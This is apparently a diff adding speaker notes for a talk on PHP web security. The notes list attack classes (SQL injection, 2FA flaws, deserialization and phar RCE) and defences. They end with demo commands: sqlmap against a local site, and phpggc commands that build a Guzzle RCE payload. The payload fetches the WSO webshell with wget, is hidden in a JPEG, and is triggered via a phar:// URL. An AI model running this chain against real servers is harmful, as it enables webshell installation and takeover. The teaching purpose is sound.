@@ -1,0 +1,75 @@
+
+- Level 1
+ - GET based actions
+ - Password hashing ???
+ - Click jacking
+ - 2FA rate limit
+ - Password changes
+  - Bypasses 2FA
+  - Doens't log the attacker out?
+  - Same when someone enables 2FA?
+ - mySQL injection
+  - Might seem obvious "we all use ORMs, we're not affected"
+   - Have you never had a query that performed so badly, that you re-wrote it in raw SQL?
+   - I never trust user input
+    - What if you don't know it's user input?
+ - Open redirects
+- Level 2
+ - Timing attacks
+ - Session Hijacking/Fixation
+- Level 3
+ - RCE via unserialize
+  - How it works
+   - Injected into intance of class (so target classes that are used in lots of places)
+   - PHPCCG
+ - RCE via phar
+  - Monolog
+  - Guzzle
+  - Run as root! (scheduler)
+
+
+  - Other Tools
+   - Metasploit
+
+
+   =====
+
+- Hackers deal with quirks
+ - Don't look at it the way we would
+
+- Most hackers hate writing code
+ - They'll use repeatable, common vectors using automated tools to find their way in
+ - This means that _any_ site can be at risk - with automation, there isn't a cost vs. reward tradeoff
+
+- Common Vectors:
+
+- SQL Injection
+ - SQL Injection combined with LOAD INFILE
+ - Load DATA OUTFILE - write a PHP script!
+ - User data is the problem - never trust it
+
+- Exposed Configuration
+ - Magmi
+
+- Gadgets
+ - Social Engineering
+
+- Time based attack
+
+- XML Injection
+
+- Solutions
+ - Don't trust user input - could alos be part of the URL
+ - Third party code/Third party APIs - what damage could they do if they were compromised?
+ - Change monitoring
+ - Audit regularly.
+
+
+
+./sqlmap.py -u http://localhost:8000/wordpress/?referralId=2
+
+[liam@liam phpggc]$ ./phpggc Guzzle/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php" > payload
+
+[liam@liam phpggc]$ ./phpggc -pj avatar.jpg Guzzle/RCE1 system "wget https://raw.githubusercontent.com/mIcHyAmRaNe/wso-webshell/master/wso.php" -o loaded.jpg
+
+http://localhost:8001/image?filename=phar://loaded.jpg
